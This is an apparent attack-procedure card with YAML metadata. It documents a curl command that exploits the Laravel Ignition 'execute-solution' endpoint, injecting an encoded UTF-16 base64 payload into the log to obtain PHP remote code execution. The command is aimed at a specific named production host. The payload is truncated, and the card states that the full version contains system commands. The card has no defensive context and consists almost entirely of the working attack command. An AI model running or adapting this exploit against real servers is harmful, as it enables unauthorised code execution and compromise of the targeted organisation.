---
data: >-
  curl -XPOST -H'Content-Type: application/json' -d
  '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=..."},}'
  https://mpos.mtn.co.sz/_ignition/execute-solution
tags:
  - rce
  - utf16
  - base64
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.562Z'
id: daaadc51-383b-4ff6-b44c-7ef01e3dddd0
verified: false
validated: true
submitted: true
---
# curl-utf16-payload-injection

## Command

```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=..."},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

## Description

Injects a quoted-printable encoded UTF-16 base64 payload into the log for PHP code execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| viewFile | Encoded payload string | Yes |

## Examples

### Basic Usage

As above with truncated payload (full includes system commands).

## Expected Output

Payload written; subsequent trigger for RCE.

## Related

- [[Related Procedure: Attempt-RCE-via-Ignition-Log-Poisoning-with-Curl]]
